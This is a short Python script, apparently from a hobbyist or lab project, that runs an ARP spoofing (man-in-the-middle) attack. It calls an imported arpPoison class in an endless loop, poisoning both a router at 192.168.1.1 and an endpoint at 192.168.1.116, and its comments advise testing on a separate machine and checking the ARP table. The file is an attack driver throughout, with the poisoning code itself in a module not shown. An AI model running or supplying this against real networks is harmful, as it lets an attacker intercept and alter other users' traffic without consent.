from ARP import arpPoison

# Need a seperate machine to test this attack on.
# Alter IP addresses to meet your own.
# Check arp table (Windows: "arp -a", Linux: "arp")

a = arpPoison

a.setup()
try:
    print("[-] Starting attack")
    while True:
        # Need both as it sends the spoofed ARP packets to both the router and endpoint
        a.poison("192.168.1.1", "192.168.1.116")
        a.poison("192.168.1.116", "192.168.1.1")
except KeyboardInterrupt:
    exit()
